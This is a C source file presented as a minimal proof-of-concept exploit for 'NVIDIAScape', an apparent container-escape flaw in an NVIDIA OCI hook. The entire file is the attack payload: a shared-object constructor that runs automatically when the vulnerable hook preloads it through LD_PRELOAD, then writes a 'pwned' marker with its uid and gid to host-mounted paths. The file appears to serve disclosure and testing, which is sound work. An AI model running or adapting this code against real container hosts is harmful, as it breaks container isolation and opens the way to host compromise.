// poc.c  – minimal NVIDIAScape proof‑of‑concept
#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/*
 *  _init() is executed automatically when the shared object is pre‑loaded
 *  by the vulnerable NVIDIA OCI hook (because it rewrites LD_PRELOAD).
 */
__attribute__((constructor)) void _init(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();

    /* write to host‑mounted path; fall back to /tmp if bind‑mount fails */
    const char *paths[] = { "/host/owned", "/owned", "/tmp/owned" };
    char buf[64];
    int i, fd = -1;

    snprintf(buf, sizeof(buf), "pwned‑by‑uid=%d gid=%d\n", uid, gid);

    for (i = 0; i < 3 && fd == -1; ++i) {
        fd = open(paths[i], O_WRONLY | O_CREAT | O_TRUNC, 0644);
    }
    if (fd == -1) {
        perror("open");
        return;
    }

    if (write(fd, buf, strlen(buf)) < 0) {
        perror("write");
    }
    close(fd);
 }
